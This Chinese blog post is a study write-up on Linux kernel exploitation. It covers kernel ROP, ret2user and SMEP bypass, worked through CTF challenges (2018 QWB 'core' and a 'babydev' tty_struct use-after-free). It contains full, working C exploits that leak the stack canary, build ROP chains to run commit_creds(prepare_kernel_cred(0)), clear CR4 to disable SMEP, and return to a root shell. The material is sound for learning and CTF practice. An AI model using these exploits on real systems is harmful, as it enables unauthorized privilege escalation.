---
title: 关于 kernel-ROP & ret2user & bypass-SMEP 的学习总结
tags:
  - kernel-ROP
  - kernel
categories:
  - 学习总结
abbrlink: a31a5755
---

内核态的 `ROP` 和用户态的思路和做法是一样的，都是利用 `gadget` 来不断控制执行流，进行任意的函数调用。不过获取基地址还有搜索 `gadget` 等一些小细节发生了变化，但思想不变，所以理解起来应该还是很快的



## kernel-ROP

例题是 [2018强网杯 pwn-core](https://github.com/cc-sir/ctf-challenge/tree/master/2018%20%E5%BC%BA%E7%BD%91%E6%9D%AFkernel%20pwn-core)

### 代码分析

发现 `ioctl` 函数中可以控制 `off` 这个全局变量（如下）

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051126597.png" alt="image-20230405112654518" style="zoom:50%;" />



`core_read` 函数，存在数组索引溢出的漏洞， `off` 我们可控，且程序没有做任何检查，`v5` 是在栈中，因此配合 `copy_to_user` 函数可以泄露栈中的任意数据，这里考虑来泄露 `canary` 以便后面的 `rop` 执行。

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051128320.png" alt="image-20230405112810250" style="zoom:50%;" />



通过分析 `off` 为 `0x40` 的时候`&v5[off]` 正好指向了 `canary` 的位置（这里就是 `PWN` 手的基本技能，所以不再赘述），`copy_to_user` 会将内核中的数据 `copy` 到用户空间中，也就是赋值给了 `a1` 。



`core_copy_func` 函数中存在一个强转的漏洞（如下），将 `__int64` 类型的 `a1` ，强转为了 `unsigned __int16` 类型，如果我们将 `a1` 设置为 `0xffffffffffff0000 | (0xd0)` ，就可以在绕过 `if(a1 > 63)` 检查的情况下执行 `qmemcpy` 函数完成栈溢出

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081646889.png" alt="image-20230408164606742" style="zoom:50%;" />

不过上面这里只是能控制 `a1` 这个字节数，想要 `ROP` 还需要控制 `name` 数组中的数据。

通过查看 `core_write` 函数，发现这里可以直接控制 `name` 数组中的内容，如此任意读和任意写都有了，就可以开始我们的 `kernel-ROP` 

![image-20230408171831543](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081718605.png)



### 利用过程

![image-20230408172611971](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081726031.png)

因为程序开了 `canary` ，所以 `ROP` 之前需要先进行泄露 `canary`



#### 泄露 `canary`

所以泄露 `canary` 的部分 `exp` 如下：

```c
#include<stdio.h>
#include<fcntl.h>
#include <unistd.h>
int main()
{
    size_t canary=0;
    size_t buf[0x80];
    int fd=open("/proc/core",O_RDWR);
    printf("core fd is %d\n",fd);
    ioctl(fd,0x6677889C,0x40);
    ioctl(fd,0x6677889B,&buf);
    canary=(size_t)(buf[0]);
    printf("canary is %p\n",canary);
    return 0;
}
```

这里一定要注意，从内核 `copy` 过来的数据有 `64` 个字节，而不是只有 `canary` ，当时程序就定义了一个 `int` 类型的变量  `canary` 传入了地址进行接收，结果直接报错（原因是破坏了用户程序的 `canary`）

![image-20230405173514198](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051735283.png)





#### 获取函数的真实地址

```c
size_t commit_creds = 0,prepare_kernel_cred = 0,vmlinux_base = 0;
size_t find_symbols(){
   FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");
   if(kallsyms_fd < 0){
      puts("[*]open kallsyms error!");
      exit(0);
   }

   char buf[0x30] = {0};
   while(fgets(buf,0x30,kallsyms_fd)){
      if(commit_creds & prepare_kernel_cred)
         return 0;//End condition
      //find commit_creds
      if(strstr(buf,"commit_creds") && !commit_creds){
         char hex[20] = {0};
         strncpy(hex,buf,16);
         sscanf(hex,"%llx",&commit_creds);
         printf("commit_creds addr: %p\n",commit_creds);
         vmlinux_base = commit_creds - 0x9c8e0;
         printf("vmlinux_base addr: %p\n",vmlinux_base);
      }
      //find prepare_kernel_cred
      if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
         char hex[20] = {0};
         strncpy(hex,buf,16);
         sscanf(hex,"%llx",&prepare_kernel_cred);
         printf("prepare_kernel_cred addr: %p\n",prepare_kernel_cred);
         vmlinux_base = prepare_kernel_cred - 0x9cce0;
      }
   }

   if(!commit_creds & !prepare_kernel_cred){
      puts("[*]read kallsyms error!");
      exit(0);
   }
} 
```

从 `/proc/kallsyms` 文件中可以获取任意一个函数的真实地址，本题的 `init` 文件中将 `/proc/kallsyms` 文件 `copy` 了一份叫做 `/tmp/kallsyms` ，读取该文件，即可得到函数的真实地址，但如果想获取 `vmlinux` 中的基地址，我们还需要拿到函数在 `vmlinux` 中的偏移。





##### 获取vmlinux中的函数偏移 

因为开了 `KASLR` ，所以函数的真实地址需要获取基地址和函数偏移才行。

使用 `readelf -s vmlinux | grep vuln` 获取其地址（如下）

![image-20230405180248088](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051802154.png)



然后再用 `checksec` 命令来获取基地址（如下）

![image-20230405180406627](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051804686.png)

得到 `prepare_kernel_cred` 的偏移为 `0x9cce0`  , `commit_creds` 函数的偏移为 `0x9c8e0` 

把这些偏移写回到上面的脚本即可，之所以要拿到 `vmlinux` 的基地址是因为后续的 `gadget` 偏移需要加上基地址才能得到 `gadget` 的真实地址。



#### 获取 `gadget`

如下方法查看 `gadget` 会比较方便

```shell
ROPgadget --binary vmlinux > ropgadget
grep ': pop rdi ; ret' ropgadget 
```

或者用 `vscode` 打开 `ropgadget` 文件， `ctrl+f` 来搜索也可以

找到的 `gadget` 需要先减去 `vmlinux` 的基地址得到 `gadget` 的偏移

最后在 `exp` 中，一个 `gadget` 的真实地址应该是 `vmlinux_base` 加上其偏移





#### `ROP` 链的布置

我们最后希望用 `ROP` 来执行 `commit_creds(prepare_kernel_cred(0))` ，`prepare_kernel_cred(0)` 会返回一个 `root` 权限的 `cred` 结构体指针，而 `commit_creds` 函数可以将该结构体指针作用于当前进程，接着我们返回用户态，去执行一个 `system("/bin/sh")` 便可以稳定的以 `root` 权限执行命令了。

正常情况下，我们需要用 `pop rdi ; ret` 这个 `gadget` 来控制 `prepare_kernel_cred` 函数的参数，我们也可以成功搜到这个 `gadget` ，但问题在于没有 `mov rdi,rax ; ret` 这个 `gadget` 来传递给 `commit_creds` 函数参数，通过搜索发现具有一个 `mov rdi, rax ; jmp rdx` 这个 `gadget` ，并且存在 `pop rdx ; ret` 来控制 `rdx` ，因此 `rop` 链的布置如下：



```c
   size_t rop[0x400]={0};
   int i=0;
   for(i=0;i<8;i++)
   {
      rop[i]=0;
   }
   rop[i++]=canary;
   rop[i++]=0xdeadbeefdeadbeef;//rbp(junk)
   rop[i++]=vmlinux_base+0xb2f;//pop rdi ; ret
   rop[i++]=0;
   rop[i++]=prepare_kernel_cred;//commit_creds(prepare_kernel_cred(0))

   rop[i++]=vmlinux_base+0xa0f49; //pop rdx ; ret
   rop[i++]=commit_creds;
   rop[i++]=vmlinux_base+0x6a6d2; //mov rdi, rax ; jmp rdx
```



此时 `commit_creds(prepare_kernel_cred(0))` 执行完毕，但需要来稳固程序，因为在内核态栈溢出后，栈中的一些数据被损坏，其中包括了用户态的状态信息，一旦损失了这些信息，重新切换到用户态时系统就会崩溃。所以我们要在攻击之前先保存一下状态信息，将其构造在内核栈中，最后返回的时候就是正常的。

系统权限分为内核态和用户态，分离的实现是 `swapgs` 指令，该指令将 `gs` 寄存器的值与 `IA32_KERNEL_GS_BASE MSR` 地址中的值交换。内核态常规操作（如系统调用）的入口处，执行 `swapgs` 指令获得指向内核数据结构的指针，那么对应的， 从内核态退出，返回到用户态时也需执行一下 `swapgs` 



`iretq` 指令用来恢复用户空间，它会从栈中弹出已经保存的 `RIP` `CS` `RFLAGS` `RSP` `SS` 恢复之前的执行环境，所以最后执行 `iretq` 指令，恢复最开始保存的寄存器值即可。

所以 `ROP` 链的部分为

```c
   size_t rop[0x400]={0};
   int i=0;
   for(i=0;i<8;i++)
   {
      rop[i]=0;
   }
   rop[i++]=canary;
   rop[i++]=0xdeadbeefdeadbeef;//rbp(junk)
   rop[i++]=vmlinux_base+0xb2f;//pop rdi ; ret
   rop[i++]=0;
   rop[i++]=prepare_kernel_cred;//commit_creds(prepare_kernel_cred(0))

   rop[i++]=vmlinux_base+0xa0f49; //pop rdx ; ret
   rop[i++]=commit_creds;
   rop[i++]=vmlinux_base+0x6a6d2; //mov rdi, rax ; jmp rdx
   
   rop[i++]=vmlinux_base+0xa012da;//swapgs; popfq; ret
   rop[i++]=0;
   rop[i++] = vmlinux_base + 0x50ac2;      //iretp_ret
   rop[i++] = (size_t)get_shell; //RIP
   rop[i++] = user_cs;//CS
   rop[i++] = user_rflags;//rflags
   rop[i++] = user_sp;//RSP
   rop[i++] = user_ss;//SS
```



下面两张图片是 `iretq` 指令执行前后的情况，可以看到已经从内核态切换到了用户态（如下）

![image-20230408183923247](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840059.png)



![image-20230408183934789](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081840996.png)





因为 `RIP` 设置的是用户态中 `system("/bin/sh")` 的地址，因此开启了新的 `root shell` （如下）

![image-20230408184359505](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081843627.png)



### EXP

```c
#include<stdio.h>
#include<fcntl.h>
#include <unistd.h>
#include<sys/types.h>
#include<sys/stat.h>
size_t commit_creds = 0,prepare_kernel_cred = 0,vmlinux_base = 0;

size_t find_symbols(){
   FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");
   if(kallsyms_fd < 0){
      puts("[*]open kallsyms error!");
      exit(0);
   }

   char buf[0x30] = {0};
   while(fgets(buf,0x30,kallsyms_fd)){
      if(commit_creds & prepare_kernel_cred)
         return 0;//End condition
      //find commit_creds
      if(strstr(buf,"commit_creds") && !commit_creds){
         char hex[20] = {0};
         strncpy(hex,buf,16);
         sscanf(hex,"%llx",&commit_creds);
         printf("commit_creds addr: %p\n",commit_creds);
         vmlinux_base = commit_creds - 0x9c8e0;
         printf("vmlinux_base addr: %p\n",vmlinux_base);
      }
      //find prepare_kernel_cred
      if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
         char hex[20] = {0};
         strncpy(hex,buf,16);
         sscanf(hex,"%llx",&prepare_kernel_cred);
         printf("prepare_kernel_cred addr: %p\n",prepare_kernel_cred);
         vmlinux_base = prepare_kernel_cred - 0x9cce0;
      }
   }

   if(!commit_creds & !prepare_kernel_cred){
      puts("[*]read kallsyms error!");
      exit(0);
   }
} 

size_t user_rflags,user_ss,user_cs,user_sp;
 void save_stats(){
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_rflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
   puts("[*]status has been saved.");
}

void get_shell()
{
   puts("[*] get shell successfully!");
   system("/bin/sh");
}

int main()
{
   size_t canary=0;
   size_t buf[0x80];
   save_stats();
   int fd=open("/proc/core",O_RDWR);
   printf("core fd is %d\n",fd);

   ioctl(fd,0x6677889C,0x40);
   ioctl(fd,0x6677889B,&buf);
   canary=(size_t)(buf[0]);
   printf("canary is %p\n",canary);
   find_symbols();

   size_t rop[0x400]={0};
   int i=0;
   for(i=0;i<8;i++)
   {
      rop[i]=0;
   }
   rop[i++]=canary;
   rop[i++]=0xdeadbeefdeadbeef;//rbp(junk)
   rop[i++]=vmlinux_base+0xb2f;//pop rdi ; ret
   rop[i++]=0;
   rop[i++]=prepare_kernel_cred;//commit_creds(prepare_kernel_cred(0))

   rop[i++]=vmlinux_base+0xa0f49; //pop rdx ; ret
   rop[i++]=commit_creds;
   rop[i++]=vmlinux_base+0x6a6d2; //mov rdi, rax ; jmp rdx
   
   rop[i++]=vmlinux_base+0xa012da;//swapgs; popfq; ret
   rop[i++]=0;
   rop[i++] = vmlinux_base + 0x50ac2;      //iretp_ret
   rop[i++] = (size_t)get_shell; //RIP
   rop[i++] = user_cs;//CS
   rop[i++] = user_rflags;//rflags
   rop[i++] = user_sp;//RSP
   rop[i++] = user_ss;//SS

   write(fd,rop,0x400);
   ioctl(fd,0x6677889A,0xffffffffffff0000 | (0xd0));
   return 0;
}
```





## ret2user

`ret2user` 和上面的 `ROP` 非常相似（毕竟本质上还是 `ROP` ），给我的感觉是 `ret2user` 在控制参数方面有很大的优势，它是将执行流返回到了用户态中布置的函数上，虽然执行的函数是位于内核空间，但因为我们的权限是 `ring 0`，因此依然可以正常运行。其根本原因是因为内核空间可以访问用户空间的进程（反之则不行），以内核的权限执行用户空间的代码完成提权（前提是没有开启 `SMEP` 保护）



### EXP

```c
#include<stdio.h>
#include<fcntl.h>
#include <unistd.h>
#include<sys/types.h>
#include<sys/stat.h>
size_t commit_creds = 0,prepare_kernel_cred = 0,vmlinux_base = 0;

size_t find_symbols(){
   FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");
   if(kallsyms_fd < 0){
      puts("[*]open kallsyms error!");
      exit(0);
   }
    
   char buf[0x30] = {0};
   while(fgets(buf,0x30,kallsyms_fd)){
      if(commit_creds & prepare_kernel_cred)
         return 0;//End condition
      //find commit_creds
      if(strstr(buf,"commit_creds") && !commit_creds){
         char hex[20] = {0};
         strncpy(hex,buf,16);
         sscanf(hex,"%llx",&commit_creds);
         printf("commit_creds addr: %p\n",commit_creds);
         vmlinux_base = commit_creds - 0x9c8e0;
         printf("vmlinux_base addr: %p\n",vmlinux_base);
      }
      //find prepare_kernel_cred
      if(strstr(buf,"prepare_kernel_cred") && !prepare_kernel_cred){
         char hex[20] = {0};
         strncpy(hex,buf,16);
         sscanf(hex,"%llx",&prepare_kernel_cred);
         printf("prepare_kernel_cred addr: %p\n",prepare_kernel_cred);
         vmlinux_base = prepare_kernel_cred - 0x9cce0;
      }
   }

   if(!commit_creds & !prepare_kernel_cred){
      puts("[*]read kallsyms error!");
      exit(0);
   }
} 

size_t user_rflags,user_ss,user_cs,user_sp;
 void save_stats(){
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_rflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
   puts("[*]status has been saved.");
   puts("[*] ret2user [*]");
}

void get_shell()
{
   puts("[*] get shell successfully!");
   system("/bin/sh");
}


void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}

int main()
{
   size_t canary=0;
   size_t buf[0x80];
   save_stats();
   int fd=open("/proc/core",O_RDWR);
   printf("core fd is %d\n",fd);

   ioctl(fd,0x6677889C,0x40);
   ioctl(fd,0x6677889B,&buf);
   canary=(size_t)(buf[0]);
   printf("canary is %p\n",canary);
   find_symbols();

   size_t rop[0x400]={0};
   int i=0;
   for(i=0;i<8;i++)
   {
      rop[i]=0;
   }
   rop[i++]=canary;
   rop[i++]=0xdeadbeefdeadbeef;//rbp(junk)
   rop[i++]=(size_t)get_root;
   rop[i++]=vmlinux_base+0xa012da;//swapgs; popfq; ret
   rop[i++]=0;
   rop[i++] = vmlinux_base + 0x50ac2;      //iretp_ret
   rop[i++] = (size_t)get_shell; //RIP
   rop[i++] = user_cs;//CS
   rop[i++] = user_rflags;//rflags
   rop[i++] = user_sp;//RSP
   rop[i++] = user_ss;//SS

   write(fd,rop,0x400);
   ioctl(fd,0x6677889A,0xffffffffffff0000 | (0xd0));
   return 0;
}

```

这两份 `EXP` 其实很像，只有执行 `commit_creds(prepare_kernel_cred(0))` 函数的部分不一样（如下）

```c
void get_root()
{
    char* (*pkc)(int) = prepare_kernel_cred;
    void (*cc)(char*) = commit_creds;
    (*cc)((*pkc)(0));
}
```

但有意思的是，无法在此处执行用户态的函数，因为我调用了 `puts` 函数，发现内核崩溃了，我认为其原因是状态寄存器没有进行切换所导致的，因此还得再回到内核中去恢复状态寄存器的值，最终执行用户态中的 `system("/bin/sh")` 



## bypass-SMEP

### 前置知识

`SMEP` 全称 `Supervisor Mode Execution Protection` ，当 `CPU` 处于 `ring0` 模式时执行用户空间的代码会触发页错误（该防御机制会将页表中的用户空间内存页标记为不可执行），目的是为了防止 `ret2user`。在启动时， `-cpu` 选项下加入 `+smep` 启用该防御机制，在 `-append` 选项下加入 `nosmep` 禁用该机制。

系统会根据 `CR4` 寄存器中第二十位的值来判断 `SMEP` 保护是否开启（ `1` 为开启，`0` 为关闭 ）

![image-20230421170620883](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304211706032.png)





在打开 `/dev/ptmx` 设备时，会分配一个 `tty_struct` 结构体，定义如下：

```c
struct tty_struct {
    int magic;
    struct kref kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;
    int index;
    /* Protects ldisc changes: Lock tty not pty */
    struct ld_semaphore ldisc_sem;
    struct tty_ldisc *ldisc;
    struct mutex atomic_write_lock;
    struct mutex legacy_mutex;
    struct mutex throttle_mutex;
    struct rw_semaphore termios_rwsem;
    struct mutex winsize_mutex;
    spinlock_t ctrl_lock;
    spinlock_t flow_lock;
    /* Termios values are protected by the termios rwsem */
    struct ktermios termios, termios_locked;
    struct termiox *termiox;    /* May be NULL for unsupported */
    char name[64];
    struct pid *pgrp;       /* Protected by ctrl lock */
    struct pid *session;
    unsigned long flags;
    int count;
    struct winsize winsize;     /* winsize_mutex */
    unsigned long stopped:1,    /* flow_lock */
              flow_stopped:1,
              unused:BITS_PER_LONG - 2;
    int hw_stopped;
    unsigned long ctrl_status:8,    /* ctrl_lock */
              packet:1,
              unused_ctrl:BITS_PER_LONG - 9;
    unsigned int receive_room;  /* Bytes free for queue */
    int flow_change;
    struct tty_struct *link;
    struct fasync_struct *fasync;
    wait_queue_head_t write_wait;
    wait_queue_head_t read_wait;
    struct work_struct hangup_work;
    void *disc_data;
    void *driver_data;
    spinlock_t files_lock;      /* protects tty_files list */
    struct list_head tty_files;
#define N_TTY_BUF_SIZE 4096
    int closing;
    unsigned char *write_buf;
    int write_cnt;
    /* If the tty has a pending do_SAK, queue it here - akpm */
    struct work_struct SAK_work;
    struct tty_port *port;
} __randomize_layout;
```

其中关注的是 `const struct tty_operations *ops` 指针，该指针指向了结构体 `tty_operations` （定义如下）

```c
struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
            struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
              const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
            unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                 unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
            unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
    int (*poll_get_char)(struct tty_driver *driver, int line);
    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    int (*proc_show)(struct seq_file *, void *);
} __randomize_layout;
```

如果能劫持掉上面的指针，在对 `/dev/ptmx` 文件进行 `write` 或者 `read` 等操作时就可以跳转我们指定的函数指针执行，有点类似于 `FSOP` 



### 利用思路

在劫持的位置先进行第一次迁移，`rax` 正好是 `fake_tty_operation` 的地址，于是，我们把栈转移到 `fake_tty_operations` 里,此处是可以放一少部分 `gadget` ，用这部分进行第二次迁移，迁移到堆块中的 `rop` 链上，用 `mov cr4,rdi` 这个 `gadget` 来改变 `cr4` 寄存器的值从而绕过 `SMEP` 保护，随后打一个 `ret2user` 即可完成提权。

此处的 `EXP` 用的是 [ha1vk](https://blog.csdn.net/seaaseesa/article/details/104577501)  师傅的，因为这题已经做过了，并且 `ha1vk` 师傅写的也很详细，再写一遍也没有什么大的改变

### EXP

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
 
//tty_struct结构体的大小
#define TTY_STRUCT_SIZE 0x2E0
//mov cr4, rdi ; pop rbp ; ret
#define MOV_CR4_RDI 0xffffffff81004d80
//pop rdi ; ret
#define POP_RDI 0xffffffff810d238d
//swapgs ; pop rbp ; ret
#define SWAPGS 0xffffffff81063694
//iretq
#define IRETQ 0xFFFFFFFF8181A797
//commit_creds函数
#define COMMIT_CREDS 0xffffffff810a1420
// prepare_kernel_cred
#define PREPARE_KERNEL_CRED 0xffffffff810a1810
//mov rsp, rax;dec ebx;ret，做栈迁移用
#define MOV_RSP_RAX 0xFFFFFFFF8181BFC5
#define POP_RAX 0xffffffff8100ce6e
 
void getRoot() {
   //函数指针
   void *(*pkc)(int) = (void *(*)(int))PREPARE_KERNEL_CRED;
   void (*cc)(void *) = (void (*)(void *))COMMIT_CREDS;
   //commit_creds(prepare_kernel_cred(0))
   (*cc)((*pkc)(0));
}
 
void getShell() {
   if (getuid() == 0) {
      printf("[+]Rooted!!\n");
      system("/bin/sh");
   } else {
      printf("[+]Root Fail!!\n");
   }
}
 
size_t user_cs,user_ss,user_flags,user_sp;
 
/*保存用户态的寄存器到变量里*/
void saveUserState() {
   __asm__("mov %cs,user_cs;"
           "mov %ss,user_ss;"
           "mov %rsp,user_sp;"
           "pushf;"
           "pop user_flags;"
           );
  puts("user states have been saved!!");
}

int main() {
   //保存用户态寄存器
   saveUserState();
   int fd1 = open("/dev/babydev",O_RDWR);
   int fd2 = open("/dev/babydev",O_RDWR);
   if (fd1 < 0 || fd2 < 0) {
      printf("open file error!!\n");
      exit(-1);
   }
   //申请一个tty_struct大小的堆
   ioctl(fd1,0x10001,TTY_STRUCT_SIZE);
   //释放这个堆
   close(fd1);
   size_t rop[0x100];
   int i = 0;
   rop[i++] = POP_RDI;
   rop[i++] = 0x6f0;
   rop[i++] = MOV_CR4_RDI;
   rop[i++] = 0;
   rop[i++] = (size_t)getRoot;
   rop[i++] = SWAPGS;
   rop[i++] = 0;
   rop[i++] = IRETQ;
   rop[i++] = (size_t)getShell;
   rop[i++] = user_cs;
   rop[i++] = user_flags;
   rop[i++] = user_sp;
   rop[i++] = user_ss;
 

   size_t fake_tty_operations[35];
   /*for (int i=0;i<35;i++) {
      fake_tty_operations[i] = 0xffffffffc0000000 + i;
   }*/
   //这个位置是write函数的指针，经过调试，我们发现当调用这个函数时，rax正好是fake_tty_operation的地址，于是，我们把栈转移到
   //fake_tty_operations里
   fake_tty_operations[7] = MOV_RSP_RAX;
   //栈转移到fake_tty_operations里后，我们继续做一次转移，把转转移到我们的rop数组里，执行ROP
   fake_tty_operations[0] = POP_RAX;
   fake_tty_operations[1] = (size_t)rop;
   fake_tty_operations[2] = MOV_RSP_RAX;
 
   size_t fake_tty_struct[4];
   //这个操作会申请tty_struct的空间，也就是会申请到我们之前释放的那个堆里，我们可以用fd2来对它操作
   int fd_tty = open("/dev/ptmx", O_RDWR);
   //我们先把原始的tty_struct前面的数据读出来，存储
   read(fd2,fake_tty_struct,4*8);
   //修改const struct tty_operations *ops;指针，指向我们伪造的tty_operations
   fake_tty_struct[3] = (size_t)fake_tty_operations;
   //把篡改过的tty_struct写回去
   write(fd2,fake_tty_struct,4*8);
   char buf[0x10];
   write(fd_tty,buf,0x10);
   return 0;
}
```





### 参考文章

[Kernel pwn 基础教程之 ret2usr 与 bypass_smep - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/175110.html)

[(47条消息) Linux Kernel Exploit 内核漏洞学习(3)-Bypass-Smep_钞sir的博客-CSDN博客](https://blog.csdn.net/qq_40827990/article/details/98937960)

[(47条消息) linux kernel pwn学习之伪造tty_struct执行任意函数_ha1vk的博客-CSDN博客](https://blog.csdn.net/seaaseesa/article/details/104577501)

[(47条消息) Linux Kernel Exploit 内核漏洞学习(2)-ROP_钞sir的博客-CSDN博客](https://blog.csdn.net/qq_40827990/article/details/98520140?spm=1001.2014.3001.5502)

[Kernel Pwn从入门到放弃 | Ama2in9](https://ama2in9.top/2020/09/03/kernel/)

[2018强网杯 core | X3h1n](https://x3h1n.github.io/2019/07/04/2018强网杯-core/)







